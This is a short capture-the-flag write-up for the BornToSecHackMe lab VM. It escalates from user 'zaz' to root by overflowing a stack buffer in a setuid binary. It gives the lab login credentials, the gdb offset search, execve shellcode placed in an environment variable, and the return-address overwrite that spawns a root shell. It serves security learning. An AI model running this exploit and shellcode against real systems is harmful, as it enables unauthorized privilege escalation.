# SHELLCODE

Starting with the knowledge gained during `writeup1.md`.

```sh
ip	: 192.168.1.7
user: zaz
pass: 646da671ca01bb5d84dbb5fb2238dc8e
```

We connect by ssh with the following credentials:

```sh
ssh zaz@192.168.1.7
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.1.7's password:
zaz@BornToSecHackMe:~$

```

1. Getting EIP offset

```sh
(gdb) source ~/peda/peda.py

gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 140
...
```

 2. Getting SHELLCODE offset

```sh
zaz@BornToSecHackMe:~$ vim env.c
zaz@BornToSecHackMe:~$ gcc env.c -o env
zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')"`
zaz@BornToSecHackMe:~$ ./env SHELLCODE
SHELLCODE: 0xbffff49b

```

 3. Executing exploit

```sh
zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print('A' * 140 + '\xbf\xff\xf4\x9b'[::-1])"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
# whoami
root
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
#
```

 4. Following along with writeup1
